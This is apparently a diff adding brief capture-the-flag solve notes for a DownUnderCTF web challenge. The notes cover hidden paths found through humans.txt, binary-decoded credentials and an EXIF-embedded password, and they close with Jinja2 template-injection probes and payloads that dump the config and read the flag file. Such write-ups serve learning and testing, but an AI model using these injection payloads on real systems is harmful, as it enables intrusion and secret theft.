@@ -1,0 +1,42 @@
+https://chal.duc.tf:30106/humans.txt
+	User-agent: humans
+	Disallow: /4dm1n_Cr3ds
+
+https://chal.duc.tf:30106/4dm1n_Cr3ds
+	Good day robot rebel. The admin cred is 6zMLV46JRp6kAmTs3nx5AG4WJgYeY.
+
+
+Hey robot devs!
+
+Delete this post the second all you robot devs see this (we can't let any humans see this). I left the secret flag at /s3cr3t_p4th/robot_fl4g.txt. Remember to delete this post ASAP!
+
+From yours truly,
+Robot Admin
+
+
+Robot Admin
+
+
+011010000111010101101101011001010110111000101110011101000111100001110100
+=> humen.txt
+0110011001101100001101000110011100101110011101000111100001110100
+=> fl4g.txt
+
+https://chal.duc.tf:30106/humen.txt
+	User-agent: humans
+	Disallow: /Bender
+
+exiftool bender.jpeg
+	Artist : 011000010110010001101101011010010110111000111010010101000110100001101001011100110010110101001001011100110010110101010100011010000110010100101101010000010110010001101101011010010110111000101101010100000110000101110011011100110111011101101111011100100110010000101101010110000100010000100001
+	=> admin:This-Is-The-Admin-Password-XD!
+
+https://chal.duc.tf:30106/admin.php
+	${7*7} -> not worked
+	{{7*7}} -> worked
+	{{7*'7'}} -> worked
+	Conclusion: Jinja2
+
+	{{ config.items() }}
+		('SECRET_KEY', "app.jinja_env.globals['getFile'] = getFile(fileName)")
+	{{ getFile("/fl4g.txt") }}
+		DUCTF{a15c011f-b595-4f7d-bc63-00dc972b3464}
